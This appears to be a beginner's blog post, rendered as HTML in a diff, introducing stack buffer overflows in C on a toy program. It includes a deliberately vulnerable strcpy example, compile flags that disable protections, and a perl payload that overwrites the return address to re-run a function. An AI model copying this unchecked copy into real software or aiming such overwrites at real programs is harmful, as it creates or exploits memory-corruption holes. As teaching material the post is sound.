@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="es-es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <script type="application/javascript" src='https://lauraonetwo.github.io/lauraonetwo/js/theme-mode.js'></script>
+    <link rel="stylesheet" href='https://lauraonetwo.github.io/lauraonetwo/css/frameworks.min.css' />
+    <link rel="stylesheet" href='https://lauraonetwo.github.io/lauraonetwo/css/github.min.css' />
+    <link rel="stylesheet" href='https://lauraonetwo.github.io/lauraonetwo/css/github-style.css' />
+    <link rel="stylesheet" href='https://lauraonetwo.github.io/lauraonetwo/css/light.css' />
+    <link rel="stylesheet" href='https://lauraonetwo.github.io/lauraonetwo/css/dark.css' />
+    <link rel="stylesheet" href='https://lauraonetwo.github.io/lauraonetwo/css/syntax.css' />
+    <title>Bugger Overglow - Laura Wang Qiu</title>
+    
+    <link rel="icon" type="image/x-icon" href='/images/github.png'>
+    
+    <meta name="theme-color" content="#1e2327">
+
+    
+    <meta name="description"
+  content="Introduction to Buffer Overflow in C" />
+<meta name="keywords"
+  content='Videogame Developer' />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://lauraonetwo.github.io/lauraonetwo/post/bugger-overglow/" />
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Bugger Overglow - Laura Wang Qiu" />
+<meta name="twitter:description"
+  content="Introduction to Buffer Overflow in C" />
+<meta name="twitter:site" content="https://lauraonetwo.github.io/lauraonetwo" />
+<meta name="twitter:creator" content="" />
+<meta name="twitter:image"
+  content="https://lauraonetwo.github.io/lauraonetwo">
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Bugger Overglow - Laura Wang Qiu">
+<meta property="og:description"
+  content="Introduction to Buffer Overflow in C" />
+<meta property="og:url" content="https://lauraonetwo.github.io/lauraonetwo/post/bugger-overglow/" />
+<meta property="og:site_name" content="Bugger Overglow" />
+<meta property="og:image"
+  content="https://lauraonetwo.github.io/lauraonetwo">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2023-10-08 02:51:50 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body>
+  <div style="position: relative">
+  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
+    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
+      <a class="Header-link" href="https://lauraonetwo.github.io/lauraonetwo">
+        <svg class="octicon" height="32" viewBox="0 0 16 16" version="1.1" width="32">
+          <path fill-rule="evenodd"
+            d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
+          </path>
+        </svg>
+      </a>
+    </div>
+    <div class="Header-item d-md-none">
+      <button class="Header-link btn-link js-details-target" type="button"
+        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
+        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
+          <path fill-rule="evenodd"
+            d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
+          </path>
+        </svg>
+      </button>
+    </div>
+    <div style="display: none;" id="header-search"
+      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
+      <div
+        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
+        <div class="position-relative">
+          <form target="_blank" action="https://www.google.com/search" accept-charset="UTF-8" method="get"
+            autocomplete="off">
+            <label
+              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
+              <input type="text"
+                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
+                name="q" value="" placeholder="Search" autocomplete="off">
+              <input type="hidden" name="q" value="site:https://lauraonetwo.github.io/lauraonetwo">
+            </label>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
+      <a class="Header-link " href="https://lauraonetwo.github.io/lauraonetwo">
+        <svg class="octicon octicon-mark-github v-align-middle" height="32" viewBox="0 0 16 16" version="1.1"
+          width="32">
+          <path fill-rule="evenodd"
+            d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
+          </path>
+        </svg>
+      </a>
+    </div>
+    <div class="Header-item" style="margin-right: 0;">
+      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
+        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
+          version="1.1" width="16" height="16">
+          <path fill-rule="evenodd" clip-rule="evenodd"
+            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
+          </path>
+        </svg>
+      </a>
+    </div>
+  </header>
+</div>
+  
+<div>
+  <main>
+    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
+      <div class="px-0">
+        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
+          <div class="flex-auto min-width-0 width-fit mr-3">
+            <div class="d-flex">
+              <div class="d-none d-md-block">
+                <a class="avatar mr-2 flex-shrink-0" href="https://lauraonetwo.github.io/lauraonetwo">
+                  <img class=" avatar-user"
+                    src="https://lauraonetwo.github.io/lauraonetwo/images/avatar.png"
+                    width="32" height="32"></a>
+              </div>
+              <div class="d-flex flex-column">
+                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
+                  <span class="author">
+                    <a href="https://lauraonetwo.github.io/lauraonetwo">lauraonetwo</a></span><span
+                    class="path-divider">/</span><strong class="css-truncate-target mr-1" style="max-width: 410px"><a
+                      href="https://lauraonetwo.github.io/lauraonetwo/post/bugger-overglow/">Bugger Overglow</a></strong>
+                </h1>
+                <div class="note m-0">
+                  Created <relative-time datetime="Sun, 08 Oct 2023 02:51:50 &#43;0200"
+                    class="no-wrap">
+                    Sun, 08 Oct 2023 02:51:50 &#43;0200</relative-time>
+
+                  
+                  <span class="file-info-divider"></span>
+                  Modified <relative-time datetime="Sun, 08 Oct 2023 18:54:24 &#43;0200"
+                    class="no-wrap">
+                    Sun, 08 Oct 2023 18:54:24 &#43;0200</relative-time>
+                  
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-lg px-3 new-discussion-timeline">
+      <div class="repository-content gist-content">
+        <div>
+          <div class="js-gist-file-update-container js-task-list-container file-box">
+            <div id="file-pytest" class="file my-2">
+              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
+                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
+                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
+                    
+                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
+                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
+                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
+                      </svg>
+                    </summary>
+                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
+                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
+                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
+                        </div>
+                      </div>
+                    </details-menu>
+                      683 Words
+                    
+
+                  </div>
+                  <div class="file-actions flex-order-2 pt-0">
+                    
+                  </div>
+                </div>
+              </div>
+
+
+              <div class="Box-body px-5 pb-5" style="z-index: 1">
+                <article class="markdown-body entry-content container-lg"><h1 id="introduction-to-buffer-overflow-in-c">Introduction to Buffer Overflow in C</h1>
+<p>I&rsquo;m actually learning <code>C</code> language and I want to focus my learning on the exploitation of binaries in C.</p>
+<p>In the next posts, I will be trying to explain to you and also to myself the most basic terms and functions in this field.</p>
+<p>👉 Main Source: <a href="https://0xword.com/es/libros/55-linux-exploiting.html">Linux Exploiting - David Puente Castro</a></p>
+<p>🚧 First of all, we must take into account&hellip;</p>
+<ul>
+<li>
+<p>The architecture: <code>x86 (IA32, x86, x86_32, i386)</code> or <code>x64 (AMD64, Intel 64, x86_64)</code>.</p>
+</li>
+<li>
+<p>Storage format: <code>little endian</code> or <code>big endian</code></p>
+</li>
+<li>
+<p>The operating system.</p>
+</li>
+</ul>
+<p><strong>All subsequent examples are done in <code>GNU/Linux x86</code>.</strong></p>
+<p>In my case, I&rsquo;m using <a href="https://ubuntu.com/download/desktop">Ubuntu Desktop</a> from Windows to perform the tests with an <code>Intel x64 architecture</code> and <code>little endian</code> format.</p>
+<p>The best options are to use a <a href="https://www.virtualbox.org/">virtual machine</a> (I recommend Oracle VM VirtualBox) or a <a href="https://www.docker.com/">Docker</a> to virtualize the work space.</p>
+<p>Pages of interest:</p>
+<ul>
+<li><a href="https://ubuntu.com/tutorials/how-to-run-ubuntu-desktop-on-a-virtual-machine-using-virtualbox#1-overview">Virtual machine tutorial with Ubuntu</a></li>
+<li><a href="https://code.visualstudio.com/docs/containers/overview">Docker in Visual Studio Code</a></li>
+</ul>
+<h2 id="what-is-a-buffer-overflow">What is a Buffer Overflow?</h2>
+<p>A buffer overflow is a computer security vulnerability that occurs when a program or process tries to store more data in a buffer (a temporary data storage area) than it can hold. As a result, the extra data can overwrite adjacent memory areas, causing unexpected behaviors in the program, such as crashes, freezes, or even the execution of malicious code.</p>
+<p>Buffer overflows are a common cause of security vulnerabilities, especially in programs written in languages like C and C++, which <strong>DO NOT perform automatic boundary checks on arrays</strong>. Attackers can exploit this vulnerability to overwrite the buffer&rsquo;s content with malicious data, such as executable code, leading to arbitrary code execution and compromising the system&rsquo;s security.</p>
+<p>Let&rsquo;s take a look into this example from the book:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#f92672">&lt;</span>string.h<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#f92672">&lt;</span>stdio.h<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#f92672">&lt;</span>stdlib.h<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">func</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>arg)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">|</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">|</span> 	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">|</span> 	<span style="color:#a6e22e">strcpy</span>(name, arg);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> 	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Welcome to Linux Exploiting %s</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, name);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">9</span> <span style="color:#f92672">|</span> }
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">10</span><span style="color:#f92672">|</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">11</span><span style="color:#f92672">|</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">12</span><span style="color:#f92672">|</span> 	<span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>) {
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">13</span><span style="color:#f92672">|</span> 		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Usage: %s NAME</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">14</span><span style="color:#f92672">|</span> 		<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">15</span><span style="color:#f92672">|</span> 	}
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">16</span><span style="color:#f92672">|</span> 	<span style="color:#a6e22e">func</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">17</span><span style="color:#f92672">|</span> 	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;End of program</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">18</span><span style="color:#f92672">|</span> 	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">19</span><span style="color:#f92672">|</span> }
+</span></span></code></pre></div><p>In <code>func() - line 4 to 9</code>, we are allocating <code>arg</code>&rsquo;s information into <code>name</code> with <code>strcpy(name, arg)</code> and printing <em>&ldquo;Welcome to Linux Exploiting [name]&rdquo;</em> into the standard output. The problem here is that <code>arg</code> can be any string of characters entered by the user as we can see in <code>func(argv[1]) - line 16</code>.</p>
+<p>So, taking into consideration that C doesn&rsquo;t perform automatic boundary checks on arrays, we could overwrite buffer&rsquo;s content like the return of the function.</p>
+<p>Let&rsquo;s compile:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc -m32 -no-pie -fno-stack-protector -o main main.c
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># As I&#39;m using x64, I need to install multilib to compile in x86 (-m32). ALSO, we need to prevent the binary from being placed in any base position (-no-pie) and disable the use of canaries (-fno-stack-protector).</span>
+</span></span></code></pre></div><p>If we execute the program&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./main Laura
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Welcome to Linux Exploiting Laura
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>End of program
+</span></span></code></pre></div><p>everything works perfectly BUT, what if we tried with another string:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./main Lauraaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Welcome to Linux Exploiting Lauraaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#75715e"># unexpected behavior</span>
+</span></span></code></pre></div><p><code>Segmentation fault</code> is the term when a program tries to access a memory location that it’s not allowed to access. It’s a mechanism provided by the operating system to prevent data corruption and unauthorized access to other programs’ memory spaces.</p>
+<p>So, what now?</p>
+<p>Let&rsquo;s disassemble the executable and then find the lines that contain the text string <code>func</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ objdump -d ./main | grep func
+</span></span><span style="display:flex;"><span>080491a6 &lt;func&gt;:
+</span></span><span style="display:flex;"><span> 8049235:       e8 6c ff ff ff          call   80491a6 &lt;func&gt;
+</span></span></code></pre></div><p>We can see the beggining of the function <code>func</code> in the memory address <code>080491a6</code>. What would happen if we exactly overwrote that memory address?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./main <span style="color:#e6db74">`</span>perl -e <span style="color:#e6db74">&#39;print &#34;A&#34;x44 . &#34;\xa6\x91\x04\x08&#34;x4&#39;</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># We pass to the program a string of characters generated by Pearl as an argument.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Welcome to Linux Exploiting AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Welcome to Linux Exploiting U��S��$�.�����N.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Welcome to Linux Exploiting U��S��$�.�����N.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Welcome to Linux Exploiting
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Welcome to Linux Exploiting 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Segmentation fault
+</span></span></code></pre></div><p>In short, we have managed to have an unexpected behavior.</p>
+</article>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<script type="application/javascript" src='https://lauraonetwo.github.io/lauraonetwo/js/toc.js'></script>
+<link rel="stylesheet" href='https://lauraonetwo.github.io/lauraonetwo/css/toc.css' />
+
+
+  <div class="footer container-xl width-full p-responsive">
+  <div
+    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
+    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="https://lauraonetwo.github.io/lauraonetwo">
+      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
+        <path fill-rule="evenodd"
+          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
+        </path>
+      </svg>
+    </a>
+    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
+      
+      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
+      
+    </ul>
+  </div>
+  <div class="d-flex flex-justify-center pb-6">
+    <span class="f6 text-gray-light"></span>
+  </div>
+
+
+</div>
+</body>
+
+<script type="application/javascript" src="https://lauraonetwo.github.io/lauraonetwo/js/github-style.js"></script>
+
+
+
+
+</html>
